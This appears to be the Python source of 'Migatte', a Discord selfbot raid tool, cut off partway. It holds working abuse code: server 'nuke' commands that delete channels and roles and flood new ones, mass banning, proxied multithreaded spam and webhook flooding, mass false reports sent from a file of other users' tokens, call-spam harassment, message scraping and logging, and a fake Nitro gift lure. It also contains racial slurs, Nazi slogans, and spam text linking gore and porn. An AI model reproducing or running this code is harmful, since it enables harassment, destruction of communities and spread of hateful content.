# coding: utf-8

import os
from colors import black, blue, red, green, yellow, cyan, reset, magenta, white
import json
import ctypes

ctypes.windll.kernel32.SetConsoleTitleW("[Migatte SelfBot] Made by Takaso")

moduli = ["discord", "requests", "asyncio", "base64", "aiohttp", "datetime", "websocket", "itertools", "lxml", "traceback", "string", "tasksio", "requests_futures"]
try:                                           
  import discord, requests, asyncio, base64, threading, aiohttp, datetime, websocket, itertools, lxml, traceback, string, tasksio, requests_futures
except ImportError:
  print("%sChecking if you have the modules installed...\n%s" % (green(), reset()))
  for librerie in moduli:
      os.system(f"python -m pip install {librerie}")

embed_handle = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| "

import discord, requests
from discord.ext import commands
import asyncio
import random
import base64
import time
import threading
import aiohttp
import datetime
import websocket
import proxygen
from itertools import cycle
import string
from discord.ext.commands import CommandNotFound
from discord import File
from tasksio import TaskPool
from requests_futures.sessions import FuturesSession

kaio = None
auto_purge = None

os.system("cls")

bakas = []
with open("tokens.txt", "r", encoding="UTF-8") as tokens:
        slaves = tokens.read().splitlines()
        for niggers in slaves:
            bakas.append(niggers)

def theintro():
    os.system("cls")
    print("""
 
            ▄▄▄▄███▄▄▄▄    ▄█     ▄██████▄     ▄████████     ███         ███        ▄████████ 
          ▄██▀▀▀███▀▀▀██▄ ███    ███    ███   ███    ███ ▀█████████▄ ▀█████████▄   ███    ███ 
          ███   ███   ███ ███▌   ███    █▀    ███    ███    ▀███▀▀██    ▀███▀▀██   ███    █▀  
          ███   ███   ███ ███▌  ▄███          ███    ███     ███   ▀     ███   ▀  ▄███▄▄▄     
          ███   ███   ███ ███▌ ▀▀███ ████▄  ▀███████████     ███         ███     ▀▀███▀▀▀     
          ███   ███   ███ ███    ███    ███   ███    ███     ███         ███       ███    █▄  
          ███   ███   ███ ███    ███    ███   ███    ███     ███         ███       ███    ███ 
           ▀█   ███   █▀  █▀     ████████▀    ███    █▀     ▄████▀      ▄████▀     ██████████ 
                                                                                     
""")

prefix = "x!"

raid = True

with open("config.json", "r") as jsonfile:
    ConfigData = json.load(jsonfile)

usertoken = ConfigData["YOURTOKEN"]

def check_token():
    r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": usertoken})
    if r.status_code == 200:
        return "y"
    elif r.status_code == 429:
        os.system("cls")

        print(f"""
╔════════════════════════════════════════════════════════════════════════════════════════════════════╗
║ [ %sAttention%s! ] You are currently blocked from accessing Discord's API | Retry after some minutes ║
╚════════════════════════════════════════════════════════════════════════════════════════════════════╝
""" % (red(), reset()))
        input()
    else:
        return "n"

account_type = "y"

Answers = ["Yes", "ye", "yes", "YeS", "YEs", "YES", "yEs", "yeS", "yeah", "Yeah", "Yep", "yep", "YE", "Ye", "yE", "y", "Y"]



os.system("cls")

if account_type == check_token():
    try:
        migatte = commands.Bot(prefix, self_bot=True)
        migatte.remove_command("help")
        headers = {
          "Authorization": usertoken
          }
    except:
      pass
else:
    try:
        intenzioni = input("\n%s[!]%s You're using a bot account, do you want the %sintents%s to be %senabled%s? Yes/No > " % (yellow(), reset(), red(), reset(), green(), reset()))
        if intenzioni in Answers:
            intents = discord.Intents().all()
            migatte = commands.Bot(prefix, intents=intents)
            migatte.remove_command("help")
            headers = {
                "authorization": f"Bot {usertoken}"
                }
        else:
            migatte = commands.Bot(prefix)
            migatte.remove_command("help")
            headers = {
                "authorization": f"Bot {usertoken}"
                }
    except:
        pass

@migatte.event
async def on_command_error(ctx, error):
    if isinstance(error, CommandNotFound):
        try:
            await ctx.message.delete()
        except:
            pass
            print("""
    ╔══════════════════╗
    ║ %sUn%sknown %scom%smand ║
    ╚══════════════════╝
""" % (red(), reset(), red(), reset()))

@migatte.event
async def on_message(message):
    await migatte.process_commands(message)
    if str(message.author.id) == str(migatte.user.id) and auto_purge == True:
        await asyncio.sleep(45)
        try:
            await message.delete()
        except:
            pass


checkweb = False
proxies = proxygen.get_proxies()
proxy_pool = cycle(proxies)

def menuu():
    print(f"""
                     ╔═════════════════════════════════════════════════════════════════════╗
                     ║ Welcome to Migatte Selfbot, it was made by %sTakaso%s, the prefix is %sx!%s ║
                     ╚═════════════════════════════════════════════════════════════════════╝
""" % (red(), reset(), red(), reset()))

def credits():
    print(f"\n%s[?] This selfbot was made by Takaso.;\n[?] Takaso can be found on GitHub, here's the link: https://github.com/Takaso,\n[?] And also he can be found YT, here's the link: https://www.youtube.com/channel/UCtZgbOCDmuLMquz5Rka9blQ\n[?] To make the toxxer work, you must insert tokens in tokens.txt\n[?] do x!menu for help.%s" % (yellow(), reset()))



def sendtowebhook():
    global raid
    raid = True
    data = {
        "content": message,
        "username": username
    }
    try:
        while raid:
            r = requests.post(webhook, data=data, proxies={"http": next(proxy_pool)})
            rj = r.json()
            if r.status_code == 429:
                time.sleep(rj['retry_after'])
            elif raid == False:
                break
    except:
        print("%s\nSomething went wrong!%s" % (red(), reset()))   

def webk2():
    threads = []
    for i in range(4):
        t = threading.Thread(target=sendtowebhook)
        threads.append(t)
        t.start()

def webk():
    global webhook
    global message
    global username
    defaultusername = "Heil Takaso"
    defaultmessage = "\nGet fucked @everyone"
    webhook = input("\n%sWhat is the webhook link? > %s" % (magenta(), reset()))
    if webhook == None:
        print("\n%sYou need to specify a webhook link for this to work...%s" % (red(), reset()))
    message = input("\n%sWhat message would you like to send? > %s" % (magenta(), reset()))
    if message == None:
        message = defaultmessage
    username = input("\n%sWhat would you like the username to be? > %s" % (magenta(), reset()))
    if username == None:
        username = defaultusername
    webk2()
    

def godspam():
    global chan
    global negro
    chan = str(input("\n%sInsert the channel ID%s > " % (magenta(), reset())))
    negro = input("\n%sChoose the message to spam%s > " % (magenta(), reset()))
    print("\n%s( Press 'q' 8 times, to stop the spam. )%s" % (blue(), reset()))
    godspam1()


def godspambase():
    global raid
    raid = True
    payload = {
        "content" : negro
        }
    try:
        while raid:
            r = requests.post(f"https://discord.com/api/v9/channels/{chan}/messages", headers=headers, data=payload, proxies={"http": next(proxy_pool)})
            if raid == False:
                break    
    except:
        pass

def godspam1():
    threads = []
    for i in range(8):
        t = threading.Thread(target=godspambase)
        threads.append(t)
        t.start()


def call():
    global raid
    raid = True
    try:
        json = {
            "recipients": [victima]
            }
        while raid:
            try:
                r = requests.post(f"https://discord.com/api/v9/channels/{chanelid}/call/ring",  headers=headers, json=json, proxies={"http": next(proxy_pool)})
                if autodisconnect in Answers:
                    r2 = requests.post(f"https://discord.com/api/v9/channels/{chanelid}/call/stop-ringing", headers=headers, json=json, proxies={"http": next(proxy_pool)})
                else:
                    print("")
                if raid == False:
                    break
                if r.status_code == 204:
                    try:
                        print("\n%s[+] Succesfully Ringed User%s" % (green(), reset()))
                    except:
                        pass                
                if r2.status_code == 204:
                    try:
                        print("\n%s[+] Succesfully Disconnected User%s" % (green(), reset()))
                    except:
                        pass
                else:
                    print("\n%s[-] Failed to ring user%s" & (red(), reset()))
            except:
                pass
    finally:
        print("\n[%s+%s] Done %sspam calling%s" % (green(), reset(), yellow(), reset()))

def report():
    print("%s\nReasons:%s\n%s0 = Illegal Content\n1 = Harassment\n2 = Spam or phishing links\n3 = Self Harm\n4 = NSFW Content%s\n%s You have to choose one of these numbers as reason!%s" % (white(), reset(), magenta(), reset(), white(), reset()))
    try:
        chanid = input("\n%sInsert channel ID: %s" % (blue(), reset()))
        msgid = input("%s\nInsert message ID: %s" % (blue(), reset()))
        gldid = input("%s\nInsert guild ID: %s" % (blue(), reset()))
        reason = input("%s\nChoose the reason: %s" % (blue(), reset()))
        numbersoftimes =  int(input("%sSelect the number of reports to do with each account: %s" % (blue(), reset())))
    except:
        print("\n%sSomething went wrong, you probably added invalid info.%s" % (red(), reset()))
    try:
        with open("tokens.txt", "r", encoding="UTF-8") as tokens:
            slaves = tokens.read().splitlines()
    except:
        print("\n[%s-%s] %sFailed to import tokens%s" % (red(), reset(), red(), reset()))
    for niggers in slaves:
        header = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36",
            "Authorization" : niggers,
            "Content-Type" : "application/json"
        }
        payload = {
            "channel_id": chanid, "message_id": msgid, "guild_id": gldid, "reason" : reason
            }
        times = 1
        while times <= numbersoftimes:
            r = requests.post('https://discord.com/api/v9/report', headers=header, json=payload, proxies={"http": next(proxy_pool)})
            if r.status_code == 201:
                print (f"\n[%s-%s] %sSuccesfully reported user {times} times. %s" % (green(), reset(), green(), reset()))
                times += 1
            else:
                print ("%s \nFailed to report. %s" % (red(), reset()))

def GcNameChanger():
    global ChanID
    global NameOfGc
    ChanID = input("\n%sInsert the group ID%s > " % (magenta(), reset()))
    NameOfGc = input("\n%sChooese the name for the GC%s > " % (magenta(), reset()))
    print("\n%s [Press 'q' 4 times to stop it.]%s" % (red(), reset()))
    ChangeAllSpeed()


def ChangeAll():
    global raid
    raid = True
    global ChanID
    global NameOfGc
    payload = {
        "name": f"{NameOfGc} | {random.randint(10000, 100000)}"
    }
    try:
        while raid:
            try:
                r = requests.patch(f"https://discord.com/api/v9/channels/{ChanID}", headers=headers, json=payload, proxies={"http": next(proxy_pool)})
            except:
                pass
            if raid == False:
                break
    except:
        pass

def ChangeAllSpeed():
    threads = []
    for i in range(4):
        t = threading.Thread(target=ChangeAll)
        threads.append(t)
        t.start()


@migatte.event
async def on_connect():
    theintro()
    print(f"""
                                      [%s+%s] Connected to > %s{migatte.user.name}%s
""" % (green(), reset(), blue(), reset()))
    print(f"""
                                      [%s+%s] User ID > %s{migatte.user.id}%s"""
% (green(), reset(), blue(), reset()))
    menuu()
    try:
        opzione = input("\n   [%s+%s] Press %sanything%s to start the selfbot > " % (green(), reset(), green(), reset()))
    except:
        pass


@migatte.command()
async def cmds(ctx):
    global kaio
    try:
        await ctx.message.delete()
    except:
        pass
    spoof=discord.Embed(title="\n✚══• **Migatte Selfbot** •══✚\n",
    description=f"""
```▶ ✭ x!antikick - Anti GC kick
▶ ✭ x!removeall - Remove all GC members
▶ ✭ x!pedo - Does a little trolling
▶ ✭ x!kaioken - Transforms the SB
▶ ✭ x!autopurge - Auto purges messages
```
""", color=0x00FFFF)
    spoof.set_image(url="https://i.pinimg.com/originals/f5/04/88/f50488848271ffcc2996ba61d98bea06.gif")
    spoof.set_author(name=f"༒•{ctx.message.author}•༒", icon_url = migatte.user.avatar_url, url = "https://www.youtube.com/watch?v=KCNOe7s1lD0")
    spoof.set_footer(text="""
✚ ▰▰▰ 【Made By Takaso™】 ▰▰▰ ✚
""")
    kaioken=discord.Embed(title="\n✚ ⍒══•〖 **_𝗠𝗶𝗴𝗮𝘁𝘁𝗲-𝗦𝗲𝗹𝗳𝗯𝗼𝘁_** 〗•══⍒ ✚\n",
    description=f"""
```
▶ ✭ x!revert - Turns off kaioken
▶ ✭ x!tokenjoin - Invite code
▶ ✭ x!tokenleave - Guild ID
▶ ✭ x!tokenspam - Channel ID
▶ ✭ x!tokendm - User ID
▶ ✭ x!limitbreak_x20 - args
▶ ✭ x!token_taskpool - args
```
""", color=0xf22534)
    kaioken.set_thumbnail(url="https://cdn.discordapp.com/attachments/859235400434057237/859400671401213952/t_migatte.gif")
    kaioken.set_image(url="https://cdn.discordapp.com/attachments/912364264772235286/926230843654021220/7e6ad2ca1cef5e28bd6d03f9d60c6f83.gif")
    kaioken.set_author(name=f"༒•{ctx.message.author}•༒", icon_url = migatte.user.avatar_url, url = "https://www.youtube.com/watch?v=XBC6RYD9yAI")
    kaioken.set_footer(text="""
✚ ▰▰▰ 【Made By Takaso™】 ▰▰▰ ✚
""")
    cocaine=discord.Embed(title="\n✚ ⍒══•〖 **_𝗠𝗶𝗴𝗮𝘁𝘁𝗲-𝗦𝗲𝗹𝗳𝗯𝗼𝘁_** 〗•══⍒ ✚\n",
    description=f"""
```
▶ ✭ x!load - User ID
▶ ✭ x!purge - No desc
▶ ✭ x!cdel - Dels the channels
▶ ✭ x!ccr - Floods the channels
▶ ✭ x!nuke - Nukes the server
▶ ✭ x!idinfo - User ID
▶ ✭ x!massban - Mass Bans
▶ ✭ x!scrape_messages - Channel ID
▶ ✭ x!gc_call - GC ID, User ID, y or n
▶ ✭ x!scan - Scans a guild weakness
▶ ✭ x!nukeresults - No desc
▶ ✭ x!nitro - Random Url
▶ ✭ x!spam_ - Message
▶ ✭ x!audithang - Bypass all anti nuke
▶ ✭ x!banspam - Fastest Mass ban
▶ ✭ x!q_del - Asyncio Queue Cdel
▶ ✭ x!limit_break - Strongest Command
▶ ✭ x!perfect_raid - No desc
▶ ✭ x!kami_cdel - No desc
▶ ✭ x!cnick - No desc
▶ ✭ x!cname - Channel
▶ ✭ x!nazi - No desc
▶ ✭ x!edit - No desc
▶ ✭ x!emoji_flood - No desc
▶ ✭ x!copy_messages - Channel ID
▶ ✭ x!calm - Ends all loops
▶ ✭ x!category - ccr under a category
▶ ✭ x!masspin - Masspins messages
▶ ✭ x!kaioken - Name says it all
```
""", color=0xc6c1b9)
    cocaine.set_image(url="https://cdn.discordapp.com/attachments/928952086828310569/929411365901316137/migatte_new_gif.gif")
    cocaine.set_author(name=f"༒•{ctx.message.author}•༒", icon_url = migatte.user.avatar_url, url = "https://www.youtube.com/watch?v=9XhaokGHBas&list=RD9XhaokGHBas&start_radio=1.")
    cocaine.set_footer(text="""
✚ ▰▰▰ 【Made By Takaso™】 ▰▰▰ ✚
""")
    try:
        if kaio == False:
            hah = await ctx.send(f"{embed_handle}https://migatte.nogokui.repl.co/gatte.html", embed=cocaine, delete_after=20)
        elif kaio == True:
            hah = await ctx.send(f"{embed_handle}https://migatte.nogokui.repl.co/kaiok.html", embed=kaioken, delete_after=20)
        else:
            hah = await ctx.send(f"{embed_handle}https://migatte.nogokui.repl.co/", embed=spoof, delete_after=20)
    except Exception as sesso:
        print(sesso)

thechans = []
@migatte.command()
async def nuke(ctx):
    global checkweb
    global serwer
    checkweb = True
    extrapayload = {
        "banner": "null",
        "icon": "null",
    }
    serwer = str(ctx.guild.id)
    try:
        await ctx.message.delete()
    except:
        pass
    guild = ctx.guild
    try:
        await guild.edit(name="Heil Takaso | Praise S.E.S.S.O Oscuro")
    except:
        pass
    try:
        r = requests.patch(f"https://canary.discord.com/api/v9/guilds/{serwer}", headers=headers, json=extrapayload)
    except:
        pass
    for c in ctx.guild.channels:
        delete_c(c)
    try:
        threadchan()
    except:
        pass
    try:
        roletasks = [deleteroles(ctx), rolenuke(ctx), lastcheck(ctx)]
        asyncio.gather(*roletasks)
    except:
        pass

channel_names = ["Hacked by Takaso", "Heil SESSO", "sus"]


##########################################################################################

# Extra Command I made to test the channel delete

@migatte.command()
async def tester(ctx, amount = 100, *, name = None):
  try:
      await ctx.message.delete()
  except:
      pass
  if name == None:
    for x in range(amount):
      try:
        await ctx.guild.create_text_channel(random.choice(channel_names))
      except discord.Forbidden:
        print("aaaaa")
        return
      except:
        pass
  else:
    for x in range(amount):
      try:
        await ctx.guild.create_text_channel(name)
      except discord.Forbidden:
        print("cazzo")
        return
      except:
        pass



async def deleteroles(ctx):
    for roles in list(ctx.guild.roles):
        try:
            await roles.delete()
        except:
            pass

async def rolenuke(ctx):
    for x in range(500):
        try:
            await ctx.guild.create_role(name="Heil Takaso | Heil S.E.S.S.O | Praise Loja")
        except:
            pass

@migatte.command()
async def lastcheck(ctx):
    for channel in ctx.guild.channels:
        if channel.name != "sesso-oscuro":
            try:
                await channel.delete()
            except:
                pass

#########################################################################################

@migatte.command()
async def load(ctx, ID):
    await ctx.message.delete()
    progress = [
     "1% - 〔█                              〕",
     "3% - 〔██                             〕",
     "6% - 〔███                            〕",
     "9% - 〔████                           〕",
     "12% -〔█████                          〕",
     "15% -〔██████                         〕",
     "18% -〔███████                        〕",
     "21% -〔███████                        〕",
     "22% -〔███████                        〕",
     "24% -〔████████                       〕",
     "26% -〔█████████                      〕",
     "29% -〔██████████                     〕",
     "31% -〔███████████                    〕",
     "36% -〔████████████                   〕",
     "41% -〔█████████████                  〕",
     "43% -〔██████████████                 〕",
     "46% -〔███████████████                〕",
     "49% -〔████████████████               〕",
     "50% -〔████████████████               〕",
     "52% -〔█████████████████              〕",
     "56% -〔██████████████████             〕",
     "59% -〔███████████████████            〕",
     "64% -〔████████████████████           〕",
     "69% -〔█████████████████████          〕",
     "71% -〔██████████████████████         〕",
     "74% -〔███████████████████████        〕",
     "79% -〔████████████████████████       〕",
     "82% -〔█████████████████████████      〕",
     "86% -〔██████████████████████████     〕",
     "89% -〔███████████████████████████    〕",
     "93% -〔████████████████████████████   〕",
     "93% -〔████████████████████████████   〕",
     "94% -〔█████████████████████████████  〕",
     "95% -〔█████████████████████████████  〕",
     "96% -〔█████████████████████████████  〕",
     "97% -〔█████████████████████████████  〕",
     "98% -〔██████████████████████████████ 〕",
     "100% -〔███████████████████████████████〕",
     "100% -〔███████████████████████████████〕",
     "100% -〔███████████████████████████████〕",
     ]
    kkk = await ctx.send(f"```\nStarting the process to steal <@{ID}>'s info.\n```")
    bar = await ctx.send("```\n0% - 〔█                              〕\n```")
    for loads in progress:
        await bar.edit(content=f"""
```
[{loads}]
```
""")
    await kkk.delete()
    await bar.delete()
    IP1 = random.randint(0, 255)
    IP2 = random.randint(0, 255)
    IP3 = random.randint(0, 255)
    IP4 = random.randint(0, 255)
    sample_string = str(ID)
    sample_string_bytes = sample_string.encode("ascii")
    base64_bytes = base64.b64encode(sample_string_bytes)
    base64_string = base64_bytes.decode("ascii")
    try:
        await ctx.send(f"""
```
Here's the Info:

IPv4: {IP1}.{IP2}.{IP3}.{IP4}
First piece of Token: {base64_string}
```
""")
    except:
        print(f"\n%sSomething went wrong, you got kicked from the guild or either the user blocked you, here's your argument {ID} in case you wanna Toxx him.%s" % (red(), reset()))

    
@migatte.command()
async def purge(ctx):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=None).filter(
        lambda m: m.author == migatte.user
    ).map(lambda m: m):
        try:
            await message.delete()
        except:
            pass


@migatte.command()
async def scrape_messages(ctx, ID = None):
    global Channel_ID
    Channel_ID = ID
    try:
        await ctx.message.delete()
    except:
        pass
    if ID == None:
        s = await ctx.send("Insert an ID.")
        asyncio.sleep(4)
        await s.delete()
    try:
        message_scraper()
    except:
        pass

def message_scraper():
    global Channel_ID
    headers = {
        "Authorization": usertoken
    }

    r = requests.get(
        f"https://discord.com/api/v9/channels/{Channel_ID}/messages", headers=headers)
    jsonn = json.loads(r.text)
    for value in jsonn:
        print(f"Name: {value['author']['username']}, Message: {value['content']}", "\n")

thechans = []
@migatte.command()
async def cdel(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    guild = ctx.guild
    for channel in guild.channels:
        thechans.append(channel.id)
    await deleteall()

async def ch(session, niggurs):
    try:
        a = await session.delete(f"https://discord.com/api/v9/channels/{niggurs}", headers=headers)
        if a.status.code == 429:
            n = a.json()
            await asyncio.sleep(n['retry_after'])
    except:
        pass


def get_chans(session):
    tasks = []
    for niggurs in thechans:
        try:
            tasks.append(ch(session, niggurs))
        except:
            pass
    return tasks

async def deleteall():
    async with aiohttp.ClientSession() as session:
        tasks = get_chans(session)
        try:
            await asyncio.gather(*tasks)
        except:
            pass 


@migatte.command()
async def ccr(ctx):
    global raid
    raid = True
    try:
        await ctx.messagge.delete()
    except:
        pass
    global serwer
    serwer = str(ctx.guild.id)
    threadchan()

def chanflood():
    global raid
    raid = True
    payload = {
        "name": "sesso-oscuro",
        "type": "0"
    }
    try:
        while raid:
            r = requests.post(f"https://discord.com/api/v9/guilds/{serwer}/channels", headers=headers, json=payload, proxies={"http": next(proxy_pool)})
            if r.status_code == 429:
                s = r.json()
                time.sleep(s['retry_after'])
            elif raid == False:
                break
    except:
        pass

def threadchan():
    threads = []
    for i in range(15):
        t = threading.Thread(target=chanflood)
        threads.append(t)
        t.start()    


@migatte.event
async def on_guild_channel_create(channel):
  global raid
  global checkweb
  raid == True
  if checkweb == True:
      webhook = await channel.create_webhook(name="Sesso")
      try:
          while True:
              await webhook.send("""
||@everyone||

> **NUKED BY TAKASO, HEIL S.E.S.S.O ||【𝙎.𝙀.𝙎.𝙎.𝙊】Tool||**

```py
"MARK IS PEDOPHILE"
```
https://www.youtube.com/watch?v=5dmYmZU4y7Y
https://www.youtube.com/watch?v=TusFQu7KV74

**KURWA!**
""")
      except:
          pass

@migatte.command()
async def idinfo(ctx, *, ID = None):
    # HypeSquad function source: https://stackoverflow.com/questions/66951118/discord-py-showing-user-badges
    try:
        await ctx.message.delete()
    except:
        pass
    if ID == None:
        await ctx.send("I forgot to put the ID.", delete_after=4)
    try:
        user = await migatte.fetch_user(ID)
    except:
        await ctx.send("Invalid ID.", delete_after=5)
    date_format = "%a, %d %b %Y %I:%M %p"
    hypesquad_class = str(user.public_flags.all()).replace('[<UserFlags.', '').replace('>]', '').replace('_',
                                                                                                         ' ').replace(
        ':', '').title()
    hypesquad_class = ''.join([i for i in hypesquad_class if not i.isdigit()])
    em=f"""
>>> ```
〓〓〚Info Card〛〓〓

[Username]

{user.name}#{user.discriminator}

[Account Creation]

{user.created_at.strftime(date_format)}

[HypeSquad]

{hypesquad_class}
```
{user.avatar_url}
"""
    try:
        await ctx.send(em, delete_after=15)
    except:
        print("\n[%s-%s] Failed to send message!" % (red()), reset())


themembers = []
@migatte.command()
async def massban(ctx):
    global guild2
    try:
        await ctx.message.delete()
    except:
        pass
    guild2 = ctx.guild.id
    guild = ctx.guild
    for members in guild.members:
        try:
            themembers.append(members.id)
            themembers.remove(migatte.user.id)
        except:
            pass
    await banall()

def get_members(session):
    tasks = []
    for server_members in themembers:
        try:
            tasks.append(session.put(f"https://discord.com/api/v9/guilds/{guild2}/bans/{server_members}", headers=headers))
        except:
            pass
    return tasks

async def banall():
    async with aiohttp.ClientSession() as session:
        tasks = get_members(session)
        try:
            await asyncio.gather(*tasks)
        except:
            pass

def lastam():
    global chan
    global negro
    chan = str(input("%sInsert the channel ID%s > " % (magenta(), reset())))
    print("\n%s( Press 'q' 8 times, to stop the spam. )%s" % (blue(), reset()))
    godspam11()


def godspambase1():
    global raid
    raid = True
    payload = {
        "content" : f"@everyone | SUBSCRIBE | https://www.youtube.com/watch?v=6HERu7qn1xg\n <@{random.choice(themembers)}> | <@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |<@{random.choice(themembers)}> |"
        }
    try:
        while raid:
            r = requests.post(f"https://discord.com/api/v9/channels/{chan}/messages", headers=headers, data=payload, proxies={"http": next(proxy_pool)})
            if raid == False:
                break    
    except:
        pass

def godspam11():
    threads = []
    for i in range(8):
        t = threading.Thread(target=godspambase1)
        threads.append(t)
        t.start()

@migatte.command()
async def last(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    guild = ctx.guild
    for members in guild.members:
        try:
            themembers.append(members.id)
            themembers.remove(migatte.user.id)
        except:
            pass
    lastam()


@migatte.command()
async def nukeresults(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    try:
        await ctx.send(f"> **There are:**\n\n```py\n{len(ctx.guild.channels)} channels\n{len(ctx.guild.roles)} roles\n```")
    except:
        pass

def start_call():
    threading.Thread(target=call).start

@migatte.command()
async def gc_call(ctx, channelid_2 = None, victima_2 = None, autodisconnect_2 = None):
    global chanelid
    global victima
    global autodisconnect
    chanelid = channelid_2
    victima = victima_2
    autodisconnect = autodisconnect_2
    try:
        await ctx.message.delete()
    except:
        pass
    if chanelid == None:
        await ctx.send("Specify the channel ID.")
    elif victima == None:
        await ctx.send("Insert the victim's ID.")
    start_call()

def send_json_request(ws, request):
    ws.send(json.dumps(request))

def recieve_json_response(ws):
    response = ws.recv()
    if response:
        return json.loads(response)

def heartbeat(interval, ws):
    print("\n[%s+%s] %sMessage logger has begun%s" % (green(), reset(), green(), reset()))
    while True:
        time.sleep(interval)
        heartbeatJSON = {
            "op": 1,
            "d": "null"
        }
        send_json_request(ws, heartbeatJSON)
        print("\n[%s+%s] %sHeartbeat sent%s" % (green(), reset(), green(), reset()))

def messagelogger():
# Full credits to https://www.youtube.com/watch?v=dR9n1zmw-Go&t=21s, this command was added when I begun to learn the websockets, and I did it thanks to that tutorial
    ws = websocket.WebSocket()
    ws.connect('wss://gateway.discord.gg/?v=6&encording=json')
    event = recieve_json_response(ws)
    
    heartbeat_interval = event['d']['heartbeat_interval'] / 1000
    threading._start_new_thread(heartbeat, (heartbeat_interval, ws))
    payload = {
        'op': 2,
        "d": {
            "token": usertoken,
            "properties": {
                "$os": "windows",
                "$browser": "chrome",
                "$device": 'pc'
                }
            }
        }
    send_json_request(ws, payload)
    while True:
        event = recieve_json_response(ws)
        try:
            print(f"\n{event['d']['author']['username']}: {event['d']['content']}")
            # print(f"%s\n{event['d']['author']['username']}%s said: %s{event['d']['content']}%s" % (green(), reset(), green(), reset()))
            op_code = event('op')
            if op_code == 11:
                print("\n[%s+%s] %sHeartbeat received%s" % (green(), reset(), green(), reset()))
        except:
            pass


cursed_text = """"
Sub to -> https://www.youtube.com/watch?v=npWrCJYrAfo

@everyone 
﻿
Halal Pictures on ---> https://kekma.net/, http://66.254.114.41/
﻿
https://kurwa.club/u/Yuxmk
https://cdn.discordapp.com/attachments/778995525865177121/781143814281756762/gore_56.mp4
﻿
SIEG HEIL HITLER
"""


@migatte.command()
async def spam_(ctx, *, args = None):
    global msg
    global chan
    global stop
    stop = True
    if args == None:
        msg = cursed_text
    else:
        msg = args
    try:
        await ctx.message.delete()
    except:
        pass
    finally:
        chan = ctx.channel.id
    godspam0()

def godspambase0():
    
    global msg
    global chan
    global stop
    stop == True
    payload = {
        "content" : msg
        }
    try:
        while True:
            r = requests.post(f"https://discord.com/api/v9/channels/{chan}/messages", headers=headers, data=payload, proxies={"http": next(proxy_pool)})
            if r.status_code == 429:
                k = r.json()
                time.sleep(['retry_after'])
            if stop == False:
                break    
    except:
        pass

def godspam0():
    threads = []
    for i in range(5):
        t = threading.Thread(target=godspambase0)
        threads.append(t)
        t.start()


def kami_cdel_base(c_id):
    try:
        r = requests.delete(f"https://discord.com/api/v9/channels/{c_id}", headers=headers, proxies={"http": next(proxy_pool)})
        if r.status_code == 429:
            j = r.json()
            time.sleep(j['retry_after'])
    except:
        pass

def delete_c(c):
    threading.Thread(target=kami_cdel_base, args=(c.id,)).start()

@migatte.command()
async def kami_cdel(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    for c in ctx.guild.channels:
        delete_c(c)


@migatte.command()
async def scan(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    g = ctx.guild.id
    try:
        r = requests.get(f"https://discord.com/api/v9/guilds/{g}/roles", headers=headers)
        everyone_role = r.json()
        for value in everyone_role:
            if value['mentionable'] == True:
                print(value['name'] + " Can be mentioned.")
    except:
        pass
    for channel in ctx.guild.channels:
        for role in ctx.guild.roles:
            overwrite = channel.overwrites_for(role)
            if overwrite.mention_everyone == True:
                print(f"You can mention everyone in {channel.name} with '{role.name}' role")
            elif overwrite.manage_webhooks == True:
                print(f"You can create webhooks in {channel.name} with '{role.name}' role")
            elif overwrite.manage_roles == True:
                print(f"You can manage roles in {channel.name} with '{role.name}' role")
            elif overwrite.manage_channels == True:
                print(f"You can manage {channel.name} with '{role.name}' role")
    print("---------------------------------------------------")


@migatte.command()
async def nitro(ctx, *, url = "https://pornhub.com"):
    try:
        await ctx.message.delete()
    except:
        pass
    warudo=discord.Embed(
        title="A Wild Gift Appears!",
        description=f"""
[https://discord.gift/{''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))}]({url})
""")
    warudo.set_thumbnail(url="https://media.discordapp.net/attachments/879080165441949786/881508563799912478/naitro.gif") 
    try:
        await ctx.send(embed=warudo)
    except:
        pass


a = {
    "description": None,
    "features": ["NEWS"],
    "preferred_locale": "en-US",
